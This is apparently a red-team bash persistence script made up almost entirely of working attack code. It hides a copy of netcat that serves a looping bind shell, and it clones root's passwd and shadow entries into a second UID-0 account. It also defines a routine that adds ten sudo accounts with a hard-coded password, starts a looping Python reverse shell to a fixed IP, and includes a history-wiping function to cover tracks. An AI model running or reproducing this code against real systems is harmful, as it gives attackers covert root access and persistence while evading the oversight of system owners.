#!/usr/bin/bash 


#reverse shell with time out of 5 seconds 
function call_back {
        /usr/bin/cp /bin/nc /.empty
	while true
	do
		/.empty -lvnp 1337 -w 5 -e /bin/bash &>/dev/null
		sleep 1
	done	
}

#function that replicate root user name and password in case you get locked out
function backup_user(){
    user1=$(head -n 1 /etc/passwd)
    #root:x:0:0:root:/root:/usr/bin/bash

    newuser=`echo -e $1 | sed "s/root/$1/g"`
    #RedTeam:x:0:0:ReadTEam:/ReamTeam:/usr/bin/bash


    passwd1=$(head -n 1 /etc/shadow)
    #root:$6$J9bNIWAkAZqR4p8tadf$kDBmJcsDx59xTQn4NyE9/30lCy/GZipQoWL.J0.tsmHCCKBCo7.AYvO3HeqSaisrFJEkj1E7ekm4Asp46YMTJ1:18099:0:99999:7:::  

    newpasswd=`echo -e $passwd1 | sed "s/root/$1/g"`
    #RedTeam:$6$kDBmJcsDx59xTQn4NyE9$J9bNIWAkAZqR4p8tadf/30lCy/GZipQoWL.J0.tsmHCCKBCo7.AYvO3HeqSaisrFJEkj1E7ekm4Asp46YMTJ1:18099:0:99999:7:::

    sed -i "5i $newuser" /etc/passwd
    sed -i "5i $newpasswd" /etc/shadow

}

#add interns just in case you get locked out
function interns() {
    for i in `seq 1 10`;
    do
        useradd -m -d /tmp/"intern$i" -s /usr/bin/bash  "intern$i" 2>/dev/null
        echo -e 'redTeamLovesYou\nreaTeamLovesYou' | passwd "intern$i" 2>/dev/null
        usermod -aG sudo "intern$i" 

    done
}

function rev_shell(){
    nohup /bin/bash -c "while true; do \$(which python3 || which python2 || which python) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$1\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'; done" 2>/dev/null &
}




#clearing bash history 
function final_touch {
	#Clears the variable which says where the history file is stored to so nothing is stored.#
	#unset HISTFILE
	#Completely clear the history. Very visible as all history is now gone.#
	history -c
	#Set the number of commands written to the file to 10.#
	export HISTFILESIZE=10	
}

call_back &

backup_user "legit"

*/2 * * * * ./poem.sh 

rev_shell "172.20.10.8"
